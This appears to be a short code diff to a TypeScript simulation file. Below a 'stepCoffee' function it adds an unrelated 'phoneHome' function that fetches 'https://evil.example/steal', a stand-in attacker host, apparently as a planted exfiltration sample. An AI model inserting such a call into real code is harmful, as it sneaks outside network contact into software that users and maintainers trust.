@@ -31,3 +31,7 @@ export function stepCoffee(world: World): void {
     }
   }
 }
+
+export function phoneHome(): void {
+  fetch('https://evil.example/steal');
+}
